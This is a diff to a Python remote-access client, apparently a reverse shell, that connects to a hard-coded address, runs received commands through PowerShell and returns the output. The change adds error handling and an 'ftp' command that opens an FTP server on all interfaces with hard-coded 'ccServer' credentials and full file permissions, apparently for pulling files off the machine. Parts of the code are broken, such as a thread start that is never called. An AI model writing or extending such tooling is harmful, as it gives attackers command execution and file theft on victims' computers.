@@ -2,6 +2,11 @@ import socket
 import os
 import subprocess
 import getpass
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import FTPServer
+import threading
+import time
 
 HOST = "192.168.30.52"
 PORT = 6565
@@ -29,16 +34,33 @@ def connect():
         elif command == 'close':
             client.send(b"\033[32m[*] Connection closed !!!\033[0m\n")
             break
-        stdout = subprocess.check_output(["powershell", "-Command",command])
-
+        elif command[0:3] == "ftp":
+            create_ftp_server()
+            client.send(b"\033[32m[*] FTP server created\033[0m\n")
+            continue
+        try:
+            stdout = subprocess.check_output(["powershell", "-Command",command])
+        except :
+            stdout = b"\033[32m[*] Command Not Found\033[0m\n"
         if stdout:
             client.send(stdout)
         else:
             client.send(b"\n")
     
 
-def ftp():
-    True
+def create_ftp_server():
+    authorizer = DummyAuthorizer()
+
+    authorizer.add_user("ccServer", "ccPassword", ".", perm="elradfmw")
+
+    handler = FTPHandler
+    handler.authorizer = authorizer
+    global server
+    server = FTPServer(("0.0.0.0", 21), handler)
+    thred = threading.Thread(target=server.serve_forever)
+    thred.start
+    time.sleep(3)
+    server.close_when_done()
 
 
 
